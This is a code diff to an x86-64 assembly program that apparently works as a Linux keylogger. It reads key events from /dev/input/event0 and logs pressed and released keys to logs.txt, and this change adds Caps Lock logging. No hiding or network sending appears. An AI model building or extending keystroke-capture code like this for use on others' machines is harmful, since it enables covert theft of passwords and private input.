@@ -181,11 +181,16 @@ keys:
     .org keys+57
     .byte 0x20
 
+    #Caps Lock
+    .org keys+58
+    .byte 0x0
+
 file: .string "/dev/input/event0"
 logs: .string "logs.txt"
 backspacePressed: .string "-Backspace key-"
 shiftKey: .string "-Shift key "
 ctrlKey: .string "-Ctrl key "
+capsKey: .string "-CapsLock "
 keyPressed: .string "was pressed-"
 keyReleased: .string "was released-"
 
@@ -202,6 +207,8 @@ main:
     movq %rsp, %rbp  
     pushq %r15
     pushq %r14
+
+    xorq %r9, %r9
 
     # open the event0 file
     movq $2, %rax
@@ -245,6 +252,9 @@ main:
         # Check if the ctrl Key was pressed
         cmpq $29, %rsi
         je CtrlKey
+
+        cmpq $58, %rsi
+        je CapsLockKey
 
         # Get the key
         addq $keys, %rsi
@@ -294,6 +304,14 @@ main:
         syscall
         jmp CheckKey
         
+    CapsLockKey:
+        movq $1, %rax
+        movq %r14, %rdi
+        movq $capsKey, %rsi
+        movq $10, %rdx
+        syscall
+        jmp CheckKey
+
     CheckKey:
         # Check if the Key was pressed or released
         cmpl $1, (%r8)
